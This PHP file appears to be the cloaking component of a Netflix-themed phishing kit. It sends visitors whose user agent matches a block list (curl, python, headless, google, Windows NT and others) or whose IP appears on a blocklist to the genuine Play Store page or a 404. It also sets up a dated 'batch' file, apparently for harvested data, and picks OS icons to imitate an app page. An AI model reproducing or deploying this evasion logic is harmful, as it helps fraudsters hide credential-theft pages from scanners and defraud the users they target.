<?php

$redirectUrl = "https://netflix.com";
$blockUrl = "https://play.google.com/store/apps/details?id=com.netflix.mediaclient";
$saveTo = "batch" . date('dmY') . ".txt";
$active = TRUE;

function isBlocked(){
		
    $useragent = $_SERVER['HTTP_USER_AGENT'];
     $blocked = array('Windows NT', 'Java', 'python', 'headless', 'apache', 'google', 'curl', 'macintosh', 'x11', 'dalvik', 'scrapper', 'messages', 'KOT49H', 'KOT49H', 'Safari/9537.53');
     
  if(strlen($useragent)<15)
        return TRUE;
        
    foreach ($blocked as $string){
            
        if(stristr($useragent, $string))
            return TRUE;
            
    }
    return FALSE;
		
}
	$allbad = file_get_contents("blocklist.txt");
	
	$ex = explode(PHP_EOL, $allbad);
	
	foreach ($ex as $current){
		
		if($_SERVER['REMOTE_ADDR'] == rtrim($current)){
			echo "OK";
			die(header('HTTP/1.0 404 Not Found'));
		}
		
	}
function get_operating_system() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $operating_system = 'Unknown Operating System';

    //Get the operating_system
    if (preg_match('/linux/i', $u_agent)) {
        $operating_system = 'inc/andr.png';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
        $operating_system = 'inc/ios.png';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
        $operating_system = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent)) {
        $operating_system = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent)) {
        $operating_system = 'inc/ios.png';
    } elseif (preg_match('/ipod/i', $u_agent)) {
        $operating_system = 'inc/ios.png';
    } elseif (preg_match('/ipad/i', $u_agent)) {
        $operating_system = 'inc/ios.png';
    } elseif (preg_match('/android/i', $u_agent)) {
        $operating_system = 'inc/andr.png';
    } elseif (preg_match('/blackberry/i', $u_agent)) {
        $operating_system = 'inc/mobi.png';
    } elseif (preg_match('/webos/i', $u_agent)) {
        $operating_system = 'inc/mobi.png';
    }
    
    return $operating_system;
}

if(!$active)
    die('We are sorry, for the moment the app appears unresponsive!');

if(isBlocked()){
    header('Location: ' . $blockUrl);
    die(header('HTTP/1.0 404 Not Found'));
}

$osIcon =  "<img src='" . get_operating_system() . "' class='img-fluid'>";


?>